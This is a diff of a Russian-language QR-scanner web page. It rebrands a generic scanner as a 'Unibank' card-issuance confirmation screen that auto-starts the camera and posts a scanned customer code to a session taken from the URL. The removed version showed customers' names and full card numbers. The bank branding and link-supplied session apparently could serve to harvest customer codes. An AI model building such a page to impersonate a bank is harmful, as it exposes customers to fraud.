@@ -2,96 +2,145 @@
 <html lang="ru">
 <head>
   <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-  <title>Сканер</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Unibank — Подтверждение</title>
   <style>
-    body,html{margin:0;padding:0;height:100%;background:#000;color:#fff;overflow:hidden;text-align:center}
-    #start{display:flex;flex-direction:column;justify-content:center;align-items:center;height:100%;background:#111}
-    button{background:#34A853;color:#fff;border:none;padding:25px 60px;font-size:30px;border-radius:25px;cursor:pointer}
-    #video{display:none;width:100vw;height:100vh;object-fit:cover}
-    .frame{position:fixed;top:50%;left:50%;width:320px;height:320px;transform:translate(-50%,-50%);border:6px solid #4CAF50;border-radius:25px;pointer-events:none;z-index:10}
-    #input{position:fixed;bottom:40px;left:50%;transform:translateX(-50%);width:90%;background:rgba(0,0,0,0.9);padding:25px;border-radius:25px;display:none}
-    input,button{width:100%;padding:20px;font-size:26px;margin:12px 0;border:none;border-radius:18px}
-    input{background:#fff;color:#000}
-    button{background:#34A853;color:#fff;font-weight:bold}
+    body {
+      margin: 0;
+      padding: 0;
+      height: 100vh;
+      background: linear-gradient(135deg, #003087, #0050b3);
+      color: white;
+      font-family: 'Segoe UI', Arial, sans-serif;
+      display: flex;
+      flex-direction: column;
+      justify-content: space-between;
+      text-align: center;
+    }
+    .header {
+      padding: 40px 20px 20px;
+    }
+    .logo {
+      width: 80px;
+      margin-bottom: 20px;
+    }
+    h1 {
+      font-size: 26px;
+      margin: 10px 0;
+      font-weight: 600;
+    }
+    .subtitle {
+      font-size: 18px;
+      opacity: 0.9;
+      margin-bottom: 40px;
+    }
+    .scanner {
+      padding: 0 30px;
+      flex-grow: 1;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+    }
+    .scan-area {
+      width: 280px;
+      height: 280px;
+      border: 4px dashed rgba(255,255,255,0.4);
+      border-radius: 50px;
+      margin: 0 auto 30px;
+      border-radius: 24px;
+      background: rgba(255,255,255,0.1);
+      backdrop-filter: blur(10px);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 80px;
+    }
+    .btn {
+      background: #00c853;
+      color: white;
+      border: none;
+      padding: 18px 40px;
+      font-size: 20px;
+      font-weight: bold;
+      border-radius: 50px;
+      margin: 20px auto;
+      box-shadow: 0 8px 25px rgba(0,200,83,0.4);
+      cursor: pointer;
+      width: 80%;
+      max-width: 320px;
+    }
+    .btn:active {
+      transform: scale(0.96);
+      background: #00b140;
+    }
+    .footer {
+      padding: 30px;
+      font-size: 14px;
+      opacity: 0.7;
+    }
   </style>
 </head>
 <body>
-  <div id="start">
-    <h1>Сканирование</h1>
-    <button onclick="go()">ОТКРЫТЬ КАМЕРУ</button>
+
+  <div class="header">
+    <img src="/cards/unibank-logo.png" alt="Unibank" class="logo">
+    <h1>Подтвердите выдачу карты</h1>
+    <div class="subtitle">Отсканируйте ваш код клиента</div>
   </div>
 
-  <video id="video" playsinline muted></video>
-  <div class="frame"></div>
-
-  <div id="input">
-    <input type="text" id="code" placeholder="Введите код клиента" autofocus>
-    <button onclick="send()">ОТПРАВИТЬ</button>
+  <div class="scanner">
+    <div class="scan-area" id="reader"></div>
+    <button class="btn" onclick="startScan()">СКАНИРОВАТЬ КОД</button>
   </div>
 
-  <script src="https://unpkg.com/jsqr@1.4.0/dist/jsQR.js"></script>
+  <div class="footer">
+    Unibank • Моментальная выдача карт
+  </div>
+
+  <script src="https://unpkg.com/html5-qrcode@2.3.8/html5-qrcode.min.js"></script>
   <script>
-    let sessionId = null;
-    const video = document.getElementById('video');
+    const urlParams = new URLSearchParams(location.search);
+    const sessionId = urlParams.get('sid');
 
-    async function go() {
-      const stream = await navigator.mediaDevices.getUserMedia({video:{facingMode:"environment"}});
-      document.getElementById("start").style.display="none";
-      video.style.display="block";
-      video.srcObject = stream;
-      video.play();
-      requestAnimationFrame(tick);
+    function startScan() {
+      const html5QrCode = new Html5Qrcode("reader");
+      const config = { fps: 10, qrbox: { width: 240, height: 240 } };
+
+      html5QrCode.start(
+        { facingMode: "environment" },
+        config,
+        (decodedText) => {
+          const code = decodedText.trim().replace(/\D/g, '');
+          if (code.length >= 6) {
+            fetch("/api/scan", {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify({ sessionId, customerCode: code })
+            })
+            .then(r => r.json())
+            .then(res => {
+              if (res.success) {
+                document.body.innerHTML = `
+                  <div style="padding:50px 30px">
+                    <div style="font-size:80px;margin-bottom:30px;">Checkmark</div>
+                    <h2 style="font-size:28px;margin:20px 0">Карта успешно подтверждена!</h2>
+                    <p style="font-size:18px;opacity:0.9">Можете закрыть эту страницу</p>
+                  </div>`;
+              } else {
+                alert("Ошибка: " + (res.error || "Код не найден"));
+              }
+            });
+            html5QrCode.stop();
+          }
+        },
+        (error) => {}
+      ).catch(err => alert("Не удалось запустить камеру"));
     }
 
-    function tick() {
-      if (video.readyState === video.HAVE_ENOUGH_DATA) {
-        const canvas = document.createElement("canvas");
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
-        const ctx = canvas.getContext("2d");
-        ctx.drawImage(video, 0, 0);
-        const code = jsQR(ctx.getImageData(0, 0, canvas.width, canvas.height).data, canvas.width, canvas.height);
-        if (code && code.data) {
-          try {
-            const d = JSON.parse(code.data);
-            if (d.sessionId) {
-              sessionId = d.sessionId;
-              document.getElementById("input").style.display = "block";
-              document.getElementById("code").focus();
-            }
-          } catch(e) {}
-        }
-      }
-      requestAnimationFrame(tick);
+    // Автозапуск сканера при открытии на телефоне
+    if (/Android|iPhone/i.test(navigator.userAgent)) {
+      setTimeout(startScan, 800);
     }
-
-    async function send() {
-      const code = document.getElementById("code").value.trim().replace(/\D/g,"");
-      if (!code) return alert("Введите код");
-
-      const r = await fetch("/api/scan", {
-        method:"POST",
-        headers:{"Content-Type":"application/json"},
-        body:JSON.stringify({sessionId, customerCode:code})
-      });
-      const j = await r.json();
-
-      if (j.success) {
-        document.body.innerHTML = `<div style="padding:60px;font-size:34px">
-          <h1 style="color:#0f0">ГОТОВО!</h1>
-          ${j.data.first_name} ${j.data.last_name}<br>
-          Карта: ${j.data.card_number ? j.data.card_number.replace(/(.{4})/g,"$1 ").trim() : "не привязана"}<br><br>
-          <span style="color:#0f0">Данные отправлены на кассу!</span>
-        </div>`;
-      } else {
-        alert("Ошибка: " + (j.error || "не найден"));
-      }
-    }
-
-    document.addEventListener("keypress", e => {
-      if (e.key==="Enter" && document.getElementById("input").style.display==="block") send();
-    });
   </script>
 </body>
 </html>
